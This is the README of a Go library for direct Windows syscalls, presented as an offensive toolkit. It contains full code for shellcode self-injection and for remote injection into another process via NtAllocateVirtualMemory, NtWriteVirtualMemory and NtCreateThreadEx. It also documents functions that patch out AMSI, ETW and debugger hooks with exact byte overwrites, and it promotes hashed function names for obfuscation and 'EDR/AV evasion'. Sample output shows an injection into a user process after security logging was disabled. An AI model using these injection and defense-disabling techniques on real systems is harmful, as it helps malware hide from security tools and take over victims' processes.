# Windows Direct Syscall Library for Go

A Go library providing **TRUE direct Windows API syscalls** using external assembly and PE parsing. This library enables developers to call any Windows API function directly through syscalls, bypassing traditional API hooking points.

## Table of Contents

- [Features](#features)
- [Demo](#demo)
- [Quick Start](#quick-start)
  - [Installation](#installation)
  - [Basic Usage](#basic-usage)
- [API Reference](#api-reference)
  - [Core Functions](#core-functions)
  - [Common API Functions](#common-api-functions)
  - [Utility Functions](#utility-functions)
  - [NT Status Code Helpers](#nt-status-code-helpers)
- [Syscall Discovery & Analysis](#syscall-discovery--analysis)
  - [DumpAllSyscalls Feature](#dumpalllsyscalls-feature)
- [Security Bypass Features](#security-bypass-features)
  - [Integration and Usage](#integration-and-usage)
- [Build Requirements](#build-requirements)
  - [Prerequisites](#prerequisites)
  - [Build Process](#build-process)
- [How It Works](#how-it-works)
  - [Architecture](#architecture)
  - [Direct Syscall Flow](#direct-syscall-flow)
  - [Assembly Function](#assembly-function)
- [Use Cases](#use-cases)
  - [Security Research](#security-research)
  - [System Programming](#system-programming)
  - [Stealth Operations](#stealth-operations)
- [Using the WinAPI Library](#using-the-winapi-library)
  - [Basic Memory Operations](#basic-memory-operations)
  - [Process Manipulation](#process-manipulation)
  - [Thread Creation and Injection](#thread-creation-and-injection)
  - [Using Raw DirectSyscall for Any API](#using-raw-directsyscall-for-any-api)
  - [Error Handling](#error-handling)
  - [Important Notes](#important-notes)
  - [Common NTSTATUS Values](#common-ntstatus-values)
- [Security Considerations](#security-considerations)
- [Examples](#examples)
- [Testing](#testing)
- [Detection](#detection)
- [Contributing](#contributing)
- [License](#license)
- [Credits](#credits)
- [Disclaimer](#disclaimer)

##  Features

- **True Direct Syscalls**: Raw `syscall` instructions with manually resolved syscall numbers
- **No API Dependencies**: Bypasses `GetProcAddress`, `LoadLibrary`, and all traditional Windows APIs
- **External Assembly**: Intel NASM assembly compiled separately and linked via cgo
- **Self-Injection Capability**: Built-in shellcode self-injection using NT APIs and CreateThread
- **Dual API Support**: Both direct syscalls (NT APIs) and regular Windows API calls via DirectCall
- **Clean Library Interface**: Simple, easy-to-use functions for any Windows API call
- **Obfuscation Support**: Function name hashing for stealth operations
- **Security Bypass**: Built-in AMSI, ETW, and debug protection bypass capabilities  
- **Syscall Table Generation**: Automatic Go source file generation with pre-computed syscall numbers
- **Comprehensive Constants**: All common Windows constants included
- **Type Safety**: Strongly typed function signatures for common APIs

## Demo
![demo1](https://github.com/user-attachments/assets/fcb4caf2-0581-4e01-81e8-9f735c5e5bc3)

## Quick Start

([View GoDocs](https://pkg.go.dev/github.com/carved4/go-direct-syscall))

### Installation

```bash
go get github.com/carved4/go-direct-syscall
```

### Basic Usage

```go
package main

import (
	"fmt"
	"unsafe"

	winapi "github.com/carved4/go-direct-syscall"
)

func main() {
	// Prewarm syscall cache
	winapi.PrewarmSyscallCache()

	// Declare shellcode
	shellcode := []byte{/* im a shellcode */}

	// Inject shellcode into current process
	err := winapi.NtInjectSelfShellcode(shellcode)
	if err != nil {
		fmt.Printf("Self-injection failed: %v\n", err)
	} else {
		fmt.Println("Self-injection succeeded")
	}
}
```

## API Reference

### Core Functions

#### `DirectSyscall(functionName string, args ...uintptr) (uintptr, error)`
Execute any Windows API function by name using direct syscalls.

```go
// Call any NTDLL function directly
status, err := winapi.DirectSyscall("NtQuerySystemInformation", 
    winapi.SystemBasicInformation,
    uintptr(unsafe.Pointer(&buffer[0])),
    uintptr(len(buffer)),
    uintptr(unsafe.Pointer(&returnLength)),
)
```

#### `DirectSyscallByHash(functionHash uint32, args ...uintptr) (uintptr, error)`
Execute syscalls using pre-computed function name hashes for obfuscation.

```go
hash := winapi.GetFunctionHash("NtAllocateVirtualMemory")
status, err := winapi.DirectSyscallByHash(hash, args...)
```

### Common API Functions

The library provides strongly-typed wrappers for common Windows APIs:

**Direct Syscall Functions (NT APIs):**
- `NtAllocateVirtualMemory` - Allocate memory in processes
- `NtWriteVirtualMemory` - Write to process memory  
- `NtReadVirtualMemory` - Read from process memory
- `NtProtectVirtualMemory` - Change memory protection
- `NtCreateThreadEx` - Create threads in processes
- `NtOpenProcess` - Open process handles
- `NtQuerySystemInformation` - Query system information
- `NtQueryInformationProcess` - Query process information
- `NtCreateFile` / `NtReadFile` / `NtWriteFile` - File operations
- `NtClose` - Close handles
- `NtWaitForSingleObject` - Wait for object signals

**High-Level Functions:**
- `NtInjectSelfShellcode` - Complete self-injection with CreateThread
- `DirectCall` - Call any Windows API function by address

**Security Bypass Functions:**
- `PatchAMSI` - Disable Anti-Malware Scan Interface
- `PatchETW` - Disable Event Tracing for Windows
- `PatchDbgUiRemoteBreakin` - Prevent remote debugger attachment
- `PatchDbgBreakPoint` - Prevent breakpoint interrupts
- `PatchNtTraceEvent` - Prevent trace event logging
- `PatchNtSystemDebugControl` - Prevent debug control operations
- `ApplyAllPatches` - Apply all security bypass patches at once
- `ApplyCriticalPatches` - Apply only AMSI and ETW patches

### Utility Functions

#### `GetSyscallNumber(functionName string) uint16`
Get the syscall number for debugging purposes.

#### `GetFunctionHash(functionName string) uint32`
Get the hash of a function name for obfuscation.

#### `DumpAllSyscalls() ([]SyscallInfo, error)`
Enumerate and dump all available syscalls from ntdll.dll with their syscall numbers, hashes, and addresses.

#### `DumpAllSyscallsWithFiles() ([]SyscallInfo, error)`
Enhanced version that enumerates syscalls and exports to both JSON and Go files. Generates a Go syscall table file for developers.

### NT Status Code Helpers

The library includes comprehensive NT status code formatting and validation functions that are used by default throughout the codebase.

#### `FormatNTStatus(status uintptr) string`
Returns a formatted string representation of an NTSTATUS code with both the hex value and human-readable description.

```go
status := uintptr(0xC0000008)
formatted := winapi.FormatNTStatus(status)
// Returns: "0xC0000008 (STATUS_INVALID_HANDLE)"

// Unknown status codes are categorized by severity
unknownStatus := uintptr(0xC0001234)
formatted = winapi.FormatNTStatus(unknownStatus)
// Returns: "0xC0001234 (Unknown ERROR status)"
```

#### `IsNTStatusSuccess(status uintptr) bool`
Checks if an NTSTATUS code indicates success (STATUS_SUCCESS).

#### `IsNTStatusError(status uintptr) bool`
Checks if an NTSTATUS code indicates an error (severity bits = 11).

#### `IsNTStatusWarning(status uintptr) bool`
Checks if an NTSTATUS code indicates a warning (severity bits = 10).

```go
status, err := winapi.NtAllocateVirtualMemory(/* args */)

if winapi.IsNTStatusSuccess(status) {
    fmt.Println("Allocation successful")
} else if winapi.IsNTStatusError(status) {
    fmt.Printf("Allocation failed: %s\n", winapi.FormatNTStatus(status))
}
```

#### Enhanced Error Messages

All syscall operations in the main program now use enhanced NT status code formatting by default. Instead of raw hex values, you'll see descriptive error messages:

**Before:**
```
NtAllocateVirtualMemory failed: 0xc0000008
```

**After:**
```
NtAllocateVirtualMemory failed: 0xC0000008 (STATUS_INVALID_HANDLE)
```

#### Supported Status Codes

The FormatNTStatus function recognizes over 30 common NTSTATUS codes including:
- `STATUS_SUCCESS` (0x00000000)
- `STATUS_INFO_LENGTH_MISMATCH` (0xC0000004)
- `STATUS_INVALID_HANDLE` (0xC0000008)
- `STATUS_INVALID_PARAMETER` (0xC000000D)
- `STATUS_ACCESS_DENIED` (0xC0000022)
- `STATUS_ACCESS_VIOLATION` (0xC0000005)
- `STATUS_NO_MEMORY` (0xC0000017)
- `STATUS_PRIVILEGE_NOT_HELD` (0xC0000061)
- And many more...

## Syscall Discovery & Analysis

###  DumpAllSyscalls Feature

The library includes a powerful syscall enumeration feature that can discover and analyze all available Windows syscalls on the current system. This is invaluable for research, debugging, and understanding the Windows API landscape.

#### Command Line Usage

```bash
# Dump all syscalls to console, JSON file and go stub
# Also demonstrates NT status code formatting examples
./cmd.exe -dump
```

#### Console Output
```
Starting syscall enumeration...
Successfully got PEB at 0x8DFAD6000, Ldr at 0x7FF87D45C4C0
Found module: cmd.exe (base: 0x7FF719D70000)
Found module: ntdll.dll (base: 0x7FF87D2F0000)
Hash match for ntdll.dll! Hash: 0x1EDAB0ED
Found ntdll.dll at: 0x7FF87D2F0000
PE SizeOfImage: 2064384 bytes
Found 2435 exports in ntdll.dll
Found 942 syscall functions:

SSN  Function Name                            Hash         Address
---- ---------------------------------------- ------------ ----------------
1    ZwWorkerFactoryWorkerReady               0x1F4EFAF7   0x7FF87D38D500
1    NtWorkerFactoryWorkerReady               0xE5659C68   0x7FF87D38D500
2    ZwAcceptConnectPort                      0x59025CF5   0x7FF87D38D520
2    NtAcceptConnectPort                      0x44832B86   0x7FF87D38D520
3    ZwMapUserPhysicalPagesScatter            0xEEA7A3F6   0x7FF87D38D540
3    NtMapUserPhysicalPagesScatter            0x5D849BC7   0x7FF87D38D540
```

#### JSON Export Structure

The dump automatically generates a timestamped JSON file with complete syscall information:

```json
{
  "timestamp": "2025-06-06T12:20:11-04:00",
  "system_info": {
    "os": "Windows",
    "architecture": "x64",
    "ntdll_base": "0x7FF87D380000"
  },
  "syscalls": [
    {
      "Name": "ZwWorkerFactoryWorkerReady",
      "Hash": 525269751,
      "SyscallNumber": 1,
      "Address": 140705229493504
    },
    {
      "Name": "NtWorkerFactoryWorkerReady",
      "Hash": 3848641640,
      "SyscallNumber": 1,
      "Address": 140705229493504
    },
    {
      "Name": "ZwAcceptConnectPort",
      "Hash": 1493327093,
      "SyscallNumber": 2,
      "Address": 140705229493536
    },
    {
      "Name": "NtAcceptConnectPort",
      "Hash": 1149447046,
      "SyscallNumber": 2,
      "Address": 140705229493536
    },
    {
      "Name": "ZwMapUserPhysicalPagesScatter",
      "Hash": 4003963894,
      "SyscallNumber": 3,
      "Address": 140705229493568
    },
```

#### Using DumpAllSyscalls Programmatically

```go
package main

import (
    "fmt"
    "log"
    
    winapi "github.com/carved4/go-direct-syscall"
)

func main() {
    // Dump all syscalls
    syscalls, err := winapi.DumpAllSyscalls()
    if err != nil {
        log.Fatal("Failed to dump syscalls:", err)
    }
    
    fmt.Printf("Found %d syscalls\n", len(syscalls))
    
    // Find specific syscalls
    for _, sc := range syscalls {
        if sc.Name == "NtAllocateVirtualMemory" {
            fmt.Printf("Found NtAllocateVirtualMemory:\n")
            fmt.Printf("  SSN: %d\n", sc.SyscallNumber)
            fmt.Printf("  Hash: 0x%X\n", sc.Hash)
            fmt.Printf("  Address: 0x%X\n", sc.Address)
        }
    }
}
```

#### Key Features

- **Complete Discovery**: Finds all Nt*/Zw* syscall functions in ntdll.dll
- **Rich Metadata**: Syscall numbers, function hashes, and memory addresses
- **Persistent Storage**: Automatic JSON export with timestamps
- **Duplicate Detection**: Shows Nt*/Zw* function pairs with same syscall numbers
- **Analysis Ready**: Structured data perfect for research and automation
- **Research Friendly**: Includes system context and metadata

#### Use Cases

**Security Research**
- Map the complete Windows syscall landscape
- Track syscall changes across Windows versions
- Identify new or modified syscalls in updates

**Malware Analysis**
- Understand available syscalls for evasion techniques
- Pre-compute function hashes for obfuscation
- Analyze syscall usage patterns

**System Administration**
- Audit available system calls
- Compare syscalls across different systems
- Generate reference documentation

**Development & Debugging**
- Verify syscall resolution is working correctly
- Debug hash collisions or resolution issues
- Understand the true Windows API surface

#### Go Syscall Table Generation

This creates two files:
- `syscall_dump_YYYYMMDD_HHMMSS.json` - Complete syscall information
- `syscall_table_YYYYMMDD_HHMMSS.go` - Go package with syscall number map

#### Generated Go File Structure

```go
// Package syscalltable provides pre-computed syscall numbers
// Auto-generated by go-direct-syscall DumpAllSyscalls function
// WARNING: These syscall numbers are specific to this Windows version
package syscalltable

// SyscallTable contains pre-computed syscall numbers for Windows NT functions
// Key: Function name, Value: Syscall number (SSN)
var SyscallTable = map[string]uint16{
    "NtAcceptConnectPort": 2,
    "NtAllocateVirtualMemory": 24,
    "NtClose": 15,
    "NtCreateFile": 85,
    "NtCreateProcess": 166,
    "NtCreateThread": 169,
    "NtCreateThreadEx": 195,
    // ... hundreds more syscalls
}

// GetSyscallNumber returns the syscall number for a given function name
func GetSyscallNumber(functionName string) uint16 {
    if ssn, exists := SyscallTable[functionName]; exists {
        return ssn
    }
    return 0
}

// GetAllSyscalls returns a copy of the complete syscall table
func GetAllSyscalls() map[string]uint16 { /* ... */ }

// GetSyscallCount returns the total number of syscalls in the table
func GetSyscallCount() int { /* ... */ }
```

#### Using Generated Syscall Table

Developers can use the generated syscall table for static syscall number lookup:

```go
import "./syscalltable" // Import generated package

func main() {
    // Look up syscall numbers without runtime resolution
    allocSSN := syscalltable.GetSyscallNumber("NtAllocateVirtualMemory")
    writeSSN := syscalltable.GetSyscallNumber("NtWriteVirtualMemory")
    
    fmt.Printf("NtAllocateVirtualMemory SSN: %d\n", allocSSN)
    fmt.Printf("NtWriteVirtualMemory SSN: %d\n", writeSSN)
    
    // Get all syscalls for analysis
    allSyscalls := syscalltable.GetAllSyscalls()
    fmt.Printf("Total syscalls: %d\n", len(allSyscalls))
}
```

**Benefits:**
- **Performance**: No runtime PE parsing or hash resolution
- **Reliability**: Pre-computed values reduce runtime dependencies
- **Analysis**: Easy to analyze syscall patterns and ranges
- **Portability**: Can be embedded in other projects

**Important Notes:**
- Syscall numbers are Windows version-specific
- Generated table prefers Nt functions over Zw equivalents
- Functions are automatically sorted alphabetically
- Only includes functions with valid syscall stubs

## Security Bypass Features

The library includes comprehensive security bypass capabilities that can disable common Windows security mechanisms before performing operations. These features use direct syscalls and manual function resolution to avoid detection.

### Available Security Patches

NOTE: USING APPLYALL ON SELF INJECTION WILL CAUSE SEGFAULT FOR REASONS UNBEKNOWNST TO ME

The library provides six different security bypass functions:

1. **PatchAMSI** - Disables Anti-Malware Scan Interface
2. **PatchETW** - Disables Event Tracing for Windows
3. **PatchDbgUiRemoteBreakin** - Prevents remote debugger attachment
4. **PatchDbgBreakPoint** - Prevents breakpoint interrupts
5. **PatchNtTraceEvent** - Prevents trace event logging
6. **PatchNtSystemDebugControl** - Prevents debug control operations

### AMSI Bypass

**Anti-Malware Scan Interface (AMSI)** is a Windows security feature that allows applications and services to integrate with any anti-malware product. The library provides `PatchAMSI()` function to disable AMSI scanning.

#### How it Works

1. **Dynamic Loading Detection**: Uses PEB walking to locate `amsi.dll` if loaded
2. **Function Resolution**: Finds `AmsiScanBuffer` using manual PE parsing
3. **Memory Patching**: Changes protection and overwrites with `xor eax, eax; ret` instruction
4. **Protection Restoration**: Restores original memory protection

#### Usage

```go
// Patch AMSI before performing operations that might trigger scanning
err := winapi.PatchAMSI()
if err != nil {
    // Handle error - amsi.dll might not be loaded
    fmt.Printf("AMSI patch failed: %v\n", err)
}
```

#### Expected Behavior

- **Success**: AMSI scanning is disabled for the current process
- **Failure**: Usually indicates `amsi.dll` is not loaded (normal for many processes)
- **No Side Effects**: Only affects the current process

### ETW Bypass

**Event Tracing for Windows (ETW)** is a Windows logging mechanism that records system events. The library provides `PatchETW()` function to disable event logging.

#### How it Works

1. **ntdll.dll Location**: Uses existing module resolution to find `ntdll.dll`
2. **Function Resolution**: Locates `EtwEventWrite` using PE parsing
3. **Memory Patching**: Overwrites function with `xor eax, eax; ret` instruction
4. **Event Logging Disabled**: No ETW events generated by current process

#### Usage

```go
// Patch ETW before performing operations to prevent event logging
err := winapi.PatchETW()
if err != nil {
    fmt.Printf("ETW patch failed: %v\n", err)
}
```

#### Expected Behavior

- **Success**: ETW event logging is disabled for the current process
- **Highly Reliable**: `ntdll.dll` is always loaded, making this patch very consistent
- **System Impact**: Only affects the current process, not system-wide

### Debug Protection Bypasses

#### DbgUiRemoteBreakin Bypass

**DbgUiRemoteBreakin** is the Windows API function used for remote debugger attachment. Patching this function prevents external debuggers from attaching to the process.

```go
// Prevent remote debugger attachment
err := winapi.PatchDbgUiRemoteBreakin()
if err != nil {
    fmt.Printf("DbgUiRemoteBreakin patch failed: %v\n", err)
}
```

**Patch Details**: Overwrites function with single `ret` instruction (0xC3)

#### DbgBreakPoint Bypass

**DbgBreakPoint** is used to trigger breakpoint interrupts. Patching this function prevents breakpoint-based debugging and analysis.

```go
// Prevent breakpoint interrupts
err := winapi.PatchDbgBreakPoint()
if err != nil {
    fmt.Printf("DbgBreakPoint patch failed: %v\n", err)
}
```

**Patch Details**: Overwrites function with `xor eax, eax; ret` (0x31, 0xC0, 0xC3)

#### NtTraceEvent Bypass

**NtTraceEvent** is used for trace event logging and debugging. Disabling this function prevents trace-based monitoring and analysis.

```go
// Prevent trace event logging
err := winapi.PatchNtTraceEvent()
if err != nil {
    fmt.Printf("NtTraceEvent patch failed: %v\n", err)
}
```

**Patch Details**: Overwrites function with `xor eax, eax; ret` (0x31, 0xC0, 0xC3)

#### NtSystemDebugControl Bypass

**NtSystemDebugControl** provides system-level debug control operations. Patching this function prevents kernel debugging interfaces from being used.

```go
// Prevent debug control operations
err := winapi.PatchNtSystemDebugControl()
if err != nil {
    fmt.Printf("NtSystemDebugControl patch failed: %v\n", err)
}
```

**Patch Details**: Overwrites function with `xor eax, eax; ret` (0x31, 0xC0, 0xC3)

### Convenience Functions

#### Apply All Patches

For convenience, the library provides functions to apply multiple patches at once:

```go
// Apply all available security patches
successful, failed := winapi.ApplyAllPatches()

fmt.Printf("Successfully applied patches: %v\n", successful)
for name, err := range failed {
    fmt.Printf("Failed to apply %s: %v\n", name, err)
}
```

#### Apply Critical Patches Only

```go
// Apply only the most important patches (AMSI and ETW)
successful, failed := winapi.ApplyCriticalPatches()

fmt.Printf("Applied %d critical patches\n", len(successful))
```

### Integration and Usage

The example application automatically applies all available patches at the optimal time:

1. **Process Enumeration**: Occurs before patching to avoid interference
2. **Process Selection**: User selects target process
3. **Security Bypass**: All six security patches are applied automatically
4. **Payload Injection**: Proceeds with comprehensive security bypass active

#### Example Output

```
go-direct-syscalls $ ./cmd.exe -example
Using embedded calc shellcode (105 bytes)
NT Status formatting enabled: Success = 0x00000000 (STATUS_SUCCESS)
Auto-selected process: Adobe Crash Processor.exe (PID: 6904)
Disabling security mechanisms...
Patching NtSystemDebugControl... SUCCESS
Patching ETW... SUCCESS
Patching DbgUiRemoteBreakin... SUCCESS
Patching DbgBreakPoint... SUCCESS
Patching NtTraceEvent... SUCCESS
Patching AMSI... FAILED: amsi.dll not found (not loaded)
Successfully applied 5/6 security patches
Injecting payload into Adobe Crash Processor.exe (PID: 6904)
Allocated memory at 0x23aaf780000, status: 0x00000000 (STATUS_SUCCESS)
NtWriteVirtualMemory debug:
  Attempt 1 - Result status: 0x0
  Attempt 1 - Bytes written: 105
Wrote 105 bytes, status: 0x00000000 (STATUS_SUCCESS)
Created thread: 0x00000000 (STATUS_SUCCESS)
Injection Successful

```

#### Manual Integration

```go
package main

import (
    "fmt"
    winapi "github.com/carved4/go-direct-syscall"
)

func main() {
    // Apply security bypasses before sensitive operations
    fmt.Println("Applying security bypasses...")
    
    if err := winapi.PatchAMSI(); err != nil {
        fmt.Printf("AMSI patch failed: %v\n", err)
    } else {
        fmt.Println("AMSI disabled successfully")
    }
    
    if err := winapi.PatchETW(); err != nil {
        fmt.Printf("ETW patch failed: %v\n", err)
    } else {
        fmt.Println("ETW disabled successfully")
    }
    
    // Proceed with your operations...
    // AMSI won't scan payloads, ETW won't log events
}
```

#### Important Considerations

**Timing**: ETW patching can interfere with some Windows APIs (like process enumeration), so patches should be applied after gathering system information but before sensitive operations.

**Scope**: Both patches only affect the current process. They do not provide system-wide bypass.

**Detection**: While these bypasses use direct syscalls and avoid common hooks, they still modify process memory and may be detected by advanced security solutions.

**Compatibility**: Both functions are designed to fail gracefully. AMSI patch failure is expected when `amsi.dll` isn't loaded. ETW patch failure is rare since `ntdll.dll` is always present.

## Build Requirements

### Prerequisites
- **Go 1.20+** with cgo enabled
- **NASM** for assembly compilation
- **GCC/MinGW** for linking (Windows)

### Build Process

The library includes pre-built assembly objects, but you can rebuild them:

```bash
# Build script handles both syscall and API call assemblies
./build.sh

# Manual build process:
# 1. Assemble the syscall function
nasm -f win64 do_syscall.S -o do_syscall.obj
ar rcs libdo_syscall.a do_syscall.obj

# 2. Assemble the API call function  
nasm -f win64 do_call.S -o do_call.obj
ar rcs libdo_call.a do_call.obj

# 3. Build your Go application
go build
```

##  How It Works

### Architecture

```
Your Go Code
     ↓
Library Interface (winapi.go)
     ↓
Hash Resolution (obf package)
     ↓
PE Parsing (syscallresolve package)
     ↓
cgo Bridge (syscall package)
     ↓
Raw NASM Assembly (do_syscall.S)
     ↓
Direct Syscall Instruction
     ↓
Windows NT Kernel
```

### Direct Syscall Flow

1. **Function Name** → **Hash** (DBJ2 algorithm)
2. **PEB Walking** → Find NTDLL base address (no LoadLibrary)
3. **PE Parsing** → Find function address (no GetProcAddress)
4. **Memory Reading** → Extract syscall number from function stub
5. **Assembly Call** → Execute raw `syscall` instruction
6. **Return** → NTSTATUS result

### Assembly Function

The core assembly function in `do_syscall.S`:

```nasm
global do_syscall
section .text

do_syscall:
    mov [rsp - 0x8],  rsi
    mov [rsp - 0x10], rdi

    mov eax, ecx
    mov rcx, rdx

    mov r10, r8
    mov rdx, r9

    mov  r8,  [rsp + 0x28]
    mov  r9,  [rsp + 0x30]

    sub rcx, 0x4
    jle skip

    lea rsi,  [rsp + 0x38]
    lea rdi,  [rsp + 0x28]

    rep movsq
skip:
    syscall

    mov rsi, [rsp - 0x8]
    mov rdi, [rsp - 0x10]

    ret 

```

## Use Cases

### Security Research
- Bypass API hooks and monitoring
- Analyze Windows internals
- Test EDR/AV evasion techniques

### System Programming
- Low-level Windows operations
- Custom memory management
- Process manipulation
- File system operations

### Stealth Operations
- Avoid API call detection

## Using the WinAPI Library

The `winapi` package provides a high-level interface for Windows syscalls with proper type safety and error handling. Here's how to use it effectively:

### Basic Memory Operations

```go
package main

import (
    "fmt"
    "unsafe"
    
    "github.com/carved4/go-direct-syscall"
)

func main() {
    // Get current process handle
    currentProcess := uintptr(0xFFFFFFFFFFFFFFFF)
    
    // Allocate memory
    var baseAddress uintptr
    size := uintptr(4096)
    
    status, err := winapi.NtAllocateVirtualMemory(
        currentProcess,
        &baseAddress,
        0,
        &size,
        0x1000|0x2000, // MEM_COMMIT | MEM_RESERVE
        0x04,          // PAGE_READWRITE
    )
    
    if err != nil || status != 0 {
        panic(fmt.Sprintf("Failed to allocate memory: 0x%X", status))
    }
    
    fmt.Printf("Allocated memory at: 0x%X\n", baseAddress)
    
    // Write data to memory
    data := []byte("Hello, World!")
    var bytesWritten uintptr
    
    status, err = winapi.NtWriteVirtualMemory(
        currentProcess,
        baseAddress,
        unsafe.Pointer(&data[0]),
        uintptr(len(data)),
        &bytesWritten,
    )
    
    if status == 0 {
        fmt.Printf("Wrote %d bytes successfully\n", bytesWritten)
    }
    
    // Read data back
    buffer := make([]byte, len(data))
    var bytesRead uintptr
    
    status, err = winapi.NtReadVirtualMemory(
        currentProcess,
        baseAddress,
        unsafe.Pointer(&buffer[0]),
        uintptr(len(buffer)),
        &bytesRead,
    )
    
    if status == 0 {
        fmt.Printf("Read back: %s\n", string(buffer))
    }
}
```

### Process Manipulation

```go
// Open a process by PID
var processHandle uintptr
pid := uintptr(1234) // Target process ID

// Create CLIENT_ID structure
clientId := struct {
    UniqueProcess uintptr
    UniqueThread  uintptr
}{
    UniqueProcess: pid,
    UniqueThread:  0,
}

status, err := winapi.NtOpenProcess(
    &processHandle,
    0x1F0FFF, // PROCESS_ALL_ACCESS
    0,        // No object attributes
    uintptr(unsafe.Pointer(&clientId)),
)

if status == 0 {
    fmt.Printf("Opened process handle: 0x%X\n", processHandle)
    
    // Don't forget to close the handle
    defer winapi.NtClose(processHandle)
}
```

### Thread Creation and Injection

```go
// Self-injection using built-in function (recommended)
func SelfInject() error {
    shellcode := []byte{0x50, 0x51, 0x52, /* ... your shellcode ... */}
    return winapi.NtInjectSelfShellcode(shellcode)
}

// Manual remote injection for educational purposes
func InjectShellcode(processHandle uintptr, shellcode []byte) error {
    // Allocate memory in target process
    var baseAddress uintptr
    size := uintptr(len(shellcode))
    
    status, err := winapi.NtAllocateVirtualMemory(
        processHandle,
        &baseAddress,
        0,
        &size,
        0x1000|0x2000, // MEM_COMMIT | MEM_RESERVE
        0x04,          // PAGE_READWRITE
    )
    
    if err != nil || status != 0 {
        return fmt.Errorf("allocation failed: 0x%X", status)
    }
    
    // Write shellcode
    var bytesWritten uintptr
    status, err = winapi.NtWriteVirtualMemory(
        processHandle,
        baseAddress,
        unsafe.Pointer(&shellcode[0]),
        uintptr(len(shellcode)),
        &bytesWritten,
    )
    
    if err != nil || status != 0 {
        return fmt.Errorf("write failed: 0x%X", status)
    }
    
    // Change protection to executable
    var oldProtect uintptr
    status, err = winapi.NtProtectVirtualMemory(
        processHandle,
        &baseAddress,
        &size,
        0x20, // PAGE_EXECUTE_READ
        &oldProtect,
    )
    
    if err != nil || status != 0 {
        return fmt.Errorf("protect failed: 0x%X", status)
    }
    
    // Create thread to execute shellcode
    var threadHandle uintptr
    status, err = winapi.NtCreateThreadEx(
        &threadHandle,
        0x1F03FF, // THREAD_ALL_ACCESS
        0,         // No object attributes
        processHandle,
        baseAddress, // Start address (our shellcode)
        0,           // No parameter
        0,           // No creation flags
        0,           // Zero bits
        0,           // Stack size
        0,           // Maximum stack size
        0,           // No attribute list
    )
    
    if err != nil || status != 0 {
        return fmt.Errorf("thread creation failed: 0x%X", status)
    }
    
    // Wait for thread completion
    timeout := uint64(5000 * 1000 * 10) // 5 seconds
    winapi.NtWaitForSingleObject(threadHandle, false, &timeout)
    winapi.NtClose(threadHandle)
    
    return nil
}
```

### Using Raw DirectSyscall for Any API

```go
// Call any NTDLL function directly by name
func QuerySystemInfo() {
    // SystemBasicInformation = 0
    var buffer [48]byte // SYSTEM_BASIC_INFORMATION size
    var returnLength uintptr
    
    status, err := winapi.DirectSyscall("NtQuerySystemInformation",
        0, // SystemBasicInformation
        uintptr(unsafe.Pointer(&buffer[0])),
        uintptr(len(buffer)),
        uintptr(unsafe.Pointer(&returnLength)),
    )
    
    if status == 0 {
        fmt.Printf("System info retrieved, %d bytes\n", returnLength)
    }
}

// Use function hash for obfuscation
func ObfuscatedCall() {
    hash := winapi.GetFunctionHash("NtQuerySystemInformation")
    
    status, err := winapi.DirectSyscallByHash(hash,
        0, // SystemBasicInformation
        // ... other args
    )
}
```

### Error Handling

The library provides built-in NT status code formatting and validation functions for better error handling:

```go
// Using built-in status helpers (recommended)
status, err := winapi.NtAllocateVirtualMemory(/* args */)
if err != nil {
    log.Fatal("Syscall error:", err)
}

if !winapi.IsNTStatusSuccess(status) {
    log.Fatalf("NtAllocateVirtualMemory failed: %s", winapi.FormatNTStatus(status))
}

// Or check for specific error types
if winapi.IsNTStatusError(status) {
    fmt.Printf("Error occurred: %s\n", winapi.FormatNTStatus(status))
} else if winapi.IsNTStatusWarning(status) {
    fmt.Printf("Warning: %s\n", winapi.FormatNTStatus(status))
}
```

```go
// Custom error handling function using built-in helpers
func CheckNTStatus(status uintptr, operation string) error {
    if winapi.IsNTStatusSuccess(status) {
        return nil
    }
    return fmt.Errorf("%s failed: %s", operation, winapi.FormatNTStatus(status))
}

// Usage example
status, err := winapi.NtAllocateVirtualMemory(/* args */)
if err := CheckNTStatus(status, "NtAllocateVirtualMemory"); err != nil {
    log.Fatal(err)
}
```

### Important Notes

1. **Handle Management**: Always close handles with `NtClose()` when done
2. **Error Checking**: Check both the Go error and NTSTATUS return value
3. **Memory Safety**: Be careful with `unsafe.Pointer` conversions
4. **Debugging**: Use `GetSyscallNumber()` to verify function resolution
5. **Timing**: Some operations may require delays (like the debug print in `NtWriteVirtualMemory`)

### Common NTSTATUS Values

- `0x00000000` - STATUS_SUCCESS
- `0xC0000005` - STATUS_ACCESS_VIOLATION  
- `0xC0000008` - STATUS_INVALID_HANDLE
- `0xC000000D` - STATUS_INVALID_PARAMETER
- `0xC0000022` - STATUS_ACCESS_DENIED
- Use function name obfuscation
- Direct kernel communication

## Recent Enhancements

### Enhanced Hash-Based Lookup System

The library now features a significantly improved hash-based lookup system with enterprise-grade robustness:

#### **Performance Optimizations**
- **Thread-Safe Caching**: All resolved syscall numbers are cached with mutex protection
- **Cache Prewarming**: `PrewarmSyscallCache()` loads all 52+ NT functions at startup  
- **Instant Lookups**: Subsequent calls return immediately from cache (microsecond response)
- **Cache Statistics**: Track performance with `GetSyscallCacheStats()`

#### **Enhanced Validation & Error Handling**
- **Syscall Stub Validation**: Validates function patterns and detects hooks
- **Multiple Pattern Recognition**: Supports different Windows syscall stub variations
- **Hook Detection**: Identifies JMP instructions indicating function hooks
- **Retry Mechanisms**: Exponential backoff for failed module resolution
- **Graceful Degradation**: Continues operation even if some validations fail

#### **Robustness Features**
- **Alternative Hash Algorithms**: SHA-256 and FNV-1a backups for hash collisions
- **Hash Collision Detection**: Automatically detects and warns about collisions
- **Memory Validation**: Comprehensive bounds checking and memory access validation
- **Debug Information**: Optional detailed logging for troubleshooting

#### **Usage Examples**

```go
// Initialize enhanced system
err := winapi.PrewarmSyscallCache()
if err != nil {
    log.Printf("Cache prewarming failed: %v", err)
}

// Validate the lookup system
err = winapi.ValidateHashLookupSystem()
if err != nil {
    log.Printf("Validation warning: %v", err)
}

// Get performance statistics
stats := winapi.GetSyscallCacheStats()
fmt.Printf("Cache size: %v, Algorithm: %v\n", 
    stats["cache_size"], stats["hash_algorithm"])

// Enhanced syscall resolution with validation
ssn, isValid, err := winapi.GetSyscallWithValidation("NtAllocateVirtualMemory")
if !isValid {
    log.Printf("Syscall validation failed for function")
}
```

### Improved User Experience

#### **Smart Process Filtering**
- **System Process Hiding**: Automatically filters out 30+ Windows system processes
- **Clean Interface**: Shows only user applications and third-party processes  
- **Safer Operation**: Reduces risk of targeting critical system components
- **Consistent Behavior**: Filtering active regardless of command-line flags

#### **Enhanced Process Selection**
- **No More System Clutter**: No `svchost.exe`, `csrss.exe`, `dwm.exe`, etc. in process list
- **Focus on Targets**: Only shows meaningful injection targets
